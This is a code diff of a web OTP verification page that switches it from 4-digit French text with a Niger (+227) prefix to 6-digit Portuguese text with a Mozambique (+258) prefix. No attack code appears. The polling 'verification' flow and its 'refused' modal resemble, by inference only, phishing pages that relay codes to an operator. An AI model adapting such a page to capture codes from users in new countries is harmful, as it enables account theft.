@@ -7,8 +7,8 @@ import { createClient } from '@/lib/supabase/client';
 import { SharedLayout } from '@/components/shared-layout';
 
 function OTPPageContent() {
-  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
-  const [timer, setTimer] = useState(45);
+  const [otpDigits, setOtpDigits] = useState(['', '', '', '', '', '']);
+  const [timer, setTimer] = useState(60);
   const [isTimerActive, setIsTimerActive] = useState(true);
   const [showExpiredModal, setShowExpiredModal] = useState(false);
   const [showLoadingModal, setShowLoadingModal] = useState(false);
@@ -195,9 +195,9 @@ const handleVerify = async () => {
         body: JSON.stringify({ phoneNumber }),
       });
       
-      setTimer(45);
+      setTimer(60);
       setIsTimerActive(true);
-      setOtpDigits(['', '', '', '']);
+      setOtpDigits(['', '', '', '', '', '']);
       otpRefs.current[0]?.focus();
     } catch (error) {
       console.error('[v0] Error resending OTP:', error);
@@ -213,9 +213,9 @@ const handleVerify = async () => {
         body: JSON.stringify({ phoneNumber }),
       });
 
-      setTimer(45);
+      setTimer(60);
       setIsTimerActive(true);
-      setOtpDigits(['', '', '', '']);
+      setOtpDigits(['', '', '', '', '', '']);
       otpRefs.current[0]?.focus();
     } catch (error) {
       console.error('[v0] Error resending OTP:', error);
@@ -231,9 +231,9 @@ const handleVerify = async () => {
         body: JSON.stringify({ phoneNumber }),
       });
 
-      setTimer(45);
+      setTimer(60);
       setIsTimerActive(true);
-      setOtpDigits(['', '', '', '']);
+      setOtpDigits(['', '', '', '', '', '']);
       otpRefs.current[0]?.focus();
     } catch (error) {
       console.error('[v0] Error resending OTP:', error);
@@ -271,16 +271,16 @@ const handleVerify = async () => {
         onClick={handleBackToLogin}
         className="flex items-center gap-2 text-gray-500 hover:text-black text-sm mb-4 transition-colors">
         <ArrowLeft className="w-4 h-4" />
-        Retour à la connexion
+        Voltar ao início de sessão
       </button>
 
       {/* OTP Verification Section */}
-      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Vérifiez votre code</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Saisissez le code à 4 chiffres envoyé à +227{phoneNumber}</p>
+      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Verifique o seu código.</h2>
+      <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Insira o código de 6 dígitos enviado para +258{phoneNumber}</p>
 
       {/* OTP Input Field */}
       <div className="mb-6 sm:mb-8">
-        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Saisissez le code OTP</label>
+        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Insira o código OTP.</label>
         <div className="flex gap-2 sm:gap-3 justify-center">
           {otpDigits.map((digit, index) => (
             <input
@@ -317,7 +317,7 @@ const handleVerify = async () => {
         onClick={handleVerify}
         disabled={!otpDigits.every(d => d) || isPolling || isLoading}
         className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors mb-3 sm:mb-4 disabled:bg-gray-300 disabled:cursor-not-allowed">
-        {isPolling ? 'Vérification en cours…...' : 'Vérifier le code'}
+        {isPolling ? 'A verificar...' : 'Verificar o código'}
          {/* {isLoading ? 'Processing...' : 'Login'} */}
         <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 rotate-180" />
       </button>
@@ -331,7 +331,7 @@ const handleVerify = async () => {
             ? 'bg-gray-200 text-gray-500 cursor-not-allowed'
             : 'bg-gray-100 text-black hover:bg-gray-200'
         }`}>
-        {isTimerActive ? 'Renvoyer le code' : 'Renvoyer le code'}
+        {isTimerActive ? 'Reenviar o código' : 'Reenviar o código'}
       </button>
     </SharedLayout>
 
@@ -340,9 +340,9 @@ const handleVerify = async () => {
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
           <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
             <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-yellow-600 animate-spin mx-auto mb-4" />
-            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Chargement…</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">A carregar…</h3>
             <p className="text-gray-500 text-sm sm:text-base">
-              Veuillez ne pas fermer cette fenêtre. Vérification de votre code OTP en cours…
+              Por favor, não feche esta janela. A verificar o seu código OTP…
             </p>
           </div>
         </div>
@@ -367,23 +367,23 @@ const handleVerify = async () => {
             </div>
 
             {/* Error Message */}
-            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code OTP expiré</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Código OTP expirado.</h3>
             <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
-              La vérification de votre code OTP a été refusée. Veuillez demander un nouveau code pour continuer.
+            A verificação do seu código OTP foi recusada. Solicite um novo código para continuar.
             </p>
 
             {/* Resend Button */}
             <button 
               onClick={handleResendFromModal}
               className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
-             Renvoyer le code
+             Reenviar o código
             </button>
 
             {/* Back to Login Button */}
             <button 
               onClick={handleBackToLogin}
               className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
-             Retour à la connexion
+             Voltar ao início de sessão
             </button>
           </div>
         </div>
@@ -408,23 +408,23 @@ const handleVerify = async () => {
             </div>
 
             {/* Error Message */}
-            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code OTP expiré</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Código OTP expirado.</h3>
             <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
-              La vérification de votre code OTP a été refusée. Veuillez demander un nouveau code pour continuer.
+              A verificação do seu código OTP foi recusada. Solicite um novo código para continuar.
             </p>
 
             {/* Resend Button */}
             <button 
               onClick={handleResendFromExpiredModal}
               className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
-              Renvoyer le code
+               Reenviar o código
             </button>
 
             {/* Back to Login Button */}
             <button 
               onClick={handleBackToLogin}
               className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
-              Retour à la connexion
+              Voltar ao início de sessão
             </button>
           </div>
         </div>
